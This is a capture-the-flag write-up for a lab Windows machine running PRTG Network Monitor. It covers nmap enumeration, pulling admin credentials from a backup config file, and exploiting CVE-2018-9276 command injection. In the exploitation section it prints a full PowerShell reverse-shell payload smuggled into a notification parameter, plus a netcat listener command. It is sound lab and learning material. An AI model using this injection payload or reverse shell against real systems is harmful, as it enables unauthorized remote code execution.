# BOXNAME
### Info:
OS: Windows<br>
IP: 10.10.10.152<br>
Difficulty : Easy<br>
### Enumeration:
```
nmap -sC -sV -oA nmap 10.10.10.152
```

gives us the results : <br>
![alt text](https://i.imgur.com/7n8ekhk.png) <br>
Finding user.txt was pretty simple it was present inside the FTP, which is highly unlikely in Real Life Scenarios.
<br>
As port 80 was open and there was a PRTG Network Monitor running on<br>
and after googling for a while I found :  <br>
https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/ <br>
Using this we found a file inside the folder similar to shown above in the link `PRTG Configuration.old.bak.dat` <br>
![alt text](https://i.imgur.com/Lb0JQjD.png) <br>
Using the creds : 
```
Username : prtgadmin
Pass: PrTg@dmin2019 (because current year)
```
We can login on the portal.
### Exploitation:
Vulnerability: Command Injection PRTG < 18.2.39 (CVE-2018-9276)<br>
https://www.codewatch.org/blog/?p=453
Using this blog above we can create a user via PRTG network monitor on the local system. <br>
Therefore we can also create a reverse tcp and listen on our host via the same Notification paramter <br>
![alt text](https://i.imgur.com/CC18BG3.png)
Payload for notification execute program parameter:
```
test.txt;$client = New-Object System.Net.Sockets.TCPClient('IP',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Saving this notification and then firing the notification via bell icon and listening on our local via `nc -lnvp port`<br> gives us the root! 
<br>
### Gained knowledge:
PRTG < 18.2.39 Command Injection Vulnerability <br>
Power Shell reverse shell
